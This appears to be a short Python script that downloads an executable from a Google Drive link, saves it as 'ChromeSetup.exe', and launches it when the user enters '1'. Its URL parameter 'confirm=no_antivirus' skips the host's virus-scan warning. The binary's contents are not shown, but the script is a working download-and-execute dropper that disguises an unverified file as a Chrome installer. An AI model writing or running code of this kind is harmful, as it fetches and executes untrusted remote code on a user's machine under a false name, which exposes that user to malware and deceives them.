import urllib.request
import os

global startup
startup = str(input('Auto run install software? [0-1]: '))
def download_url(url, save_path):
    with urllib.request.urlopen(url) as dl_file:
        with open(save_path, 'wb') as out_file:
            out_file.write(dl_file.read())
            out_file.close()
            if(startup == '1'):
                os.startfile(save_path)


download_url('https://drive.google.com/uc?export=download&confirm=no_antivirus&id=16qxnHcH64s-q_1DHC8FK-ETZXJ6NGEhP','ChromeSetup.exe')

